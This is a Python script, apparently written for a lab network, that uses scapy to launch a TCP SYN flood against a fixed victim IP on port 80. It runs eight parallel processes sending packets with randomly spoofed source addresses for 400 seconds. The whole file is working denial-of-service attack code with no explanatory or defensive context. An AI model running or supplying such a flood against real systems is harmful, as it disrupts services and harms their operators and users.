from scapy.all import *
import random
import time
from multiprocessing import Process

victim_ip = "192.168.2.69"
duration = 400
interface = "virbr-labs"

def flood_worker(worker_id):
    attackers = [str(RandIP()._fix()) for _ in range(7)]
    end_time = time.time() + duration
    while time.time() < end_time:
        attacker_ip = random.choice(attackers)
        pkt = (
            Ether() /
            IP(src=attacker_ip, dst=victim_ip) /
            TCP(flags="S", sport=random.randint(1024, 65535), dport=80)
        )
        sendp(pkt, iface=interface, verbose=False)

if __name__ == "__main__":
    num_workers = 8
    processes = [Process(target=flood_worker, args=(i,)) for i in range(num_workers)]
    for p in processes:
        p.start()
    print("TCP SYN Flood started!")
    for p in processes:
        p.join()
    print("TCP SYN Flood done!")
